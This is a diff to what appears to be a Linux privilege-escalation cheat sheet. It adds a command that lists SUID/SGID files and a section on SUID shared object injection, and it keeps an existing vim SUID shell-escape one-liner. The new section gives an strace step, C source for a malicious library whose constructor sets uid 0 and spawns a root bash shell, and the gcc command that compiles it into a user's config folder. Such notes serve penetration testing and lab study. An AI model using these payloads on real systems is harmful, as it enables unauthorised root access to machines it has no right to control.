@@ -114,6 +114,7 @@ Search for SUID binaries:
 ```bash
 find / -perm -4000 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 
 Common exploitable binaries:
@@ -140,6 +141,33 @@ vim suid privilege escalation
 ```
 /usr/bin/vim -c ':set shell=/bin/bash\ -p' -c ':shell'
 ```
+
+## SUID / SGID Executables - Shared Object Injection
+Run strace on the file and search the output for open/access calls and for "no such file" errors:
+
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+
+Example so file
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+	setuid(0);
+	system("/bin/bash -p");
+}
+
+```
+
+```
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+
+then run the SUID binary
 
 ---
 
